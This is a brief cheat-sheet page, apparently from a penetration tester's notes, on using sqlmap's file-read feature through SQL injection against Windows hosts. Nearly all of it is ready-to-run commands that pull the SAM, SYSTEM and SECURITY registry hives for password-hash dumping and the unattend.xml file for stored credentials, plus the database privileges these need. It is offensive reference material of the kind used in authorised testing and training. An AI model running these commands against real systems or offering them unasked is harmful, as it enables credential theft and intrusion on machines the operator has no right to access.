# Windows

Search Tag(s): #sqlmap #enumeration-and-discovery #credential-access-and-dumping

## Conditions

1. The DB user must have **FILE** and **SELECT** privileges perform with the flags `--privileges -U CU`.
2. Not all files are readable unless the current user is `root@<IP>` (e.g. `root@localhost`). You'll notice that you can't fetch SSH credentials which is normal due to security reasons.

## Automated

### Hashdump

```
$ sqlmap -u "<URL>" --random-agent --file-read="C:/Windows/System32/config/security"
           
$ sqlmap -u "<URL>" --random-agent --file-read="C:/Windows/System32/config/system"

$ sqlmap -u "<URL>" --random-agent --file-read="C:/Windows/System32/config/sam"
```

### Group Policy Preferences

```
$ sqlmap -u "<URL>" --random-agent --file-read="C:\Windows\Panther\unattend.xml"
```